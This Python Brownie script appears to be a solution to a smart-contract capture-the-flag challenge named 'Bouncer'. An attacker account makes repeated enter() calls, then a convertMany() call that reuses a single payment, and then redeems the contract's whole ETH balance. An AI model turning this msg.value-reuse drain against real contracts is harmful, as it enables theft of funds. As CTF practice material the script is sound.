from brownie import (
    network,
    accounts,
    config,
    interface,
    BouncerSetup,
    Bouncer,
)
from scripts.helpful_scripts import (
    get_account,
    check_solution
)
from web3 import Web3


def main():
    deployer = get_account(index=0)
    attacker = get_account(index=1)

    # setup challenge
    ETH_CONST = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
    setup_contract = BouncerSetup.deploy({"from": deployer, "value": Web3.toWei(100, 'ether')})
    bouncer_contract = Bouncer.at(setup_contract.bouncer())

    # solve challenge
    value = Web3.toWei(10, 'ether')
    num_enters = 7

    print("Bouncer balance:", Web3.fromWei(bouncer_contract.balance(), 'ether'))
    print()

    for _ in range(num_enters):
        tx =bouncer_contract.enter(ETH_CONST, value, {"from": attacker, "value": Web3.toWei(1, 'ether')})
        tx.wait(1)
    print("Bouncer balance:", Web3.fromWei(bouncer_contract.balance(), 'ether'))
    print()
    
    tx = bouncer_contract.convertMany(attacker, list(range(num_enters)), {"from": attacker, "value": value})
    tx.wait(1)

    print("Bouncer balance:", Web3.fromWei(bouncer_contract.balance(), 'ether'))
    print()
    
    tx = bouncer_contract.redeem(ETH_CONST, bouncer_contract.balance(), {"from": attacker})
    tx.wait(1)

    print("Bouncer balance:", Web3.fromWei(bouncer_contract.balance(), 'ether'))
    print()
    
    # check the solution
    check_solution(setup_contract)